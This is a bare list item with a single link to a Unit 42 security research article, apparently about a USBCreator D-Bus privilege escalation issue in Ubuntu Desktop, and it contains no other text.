 - [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
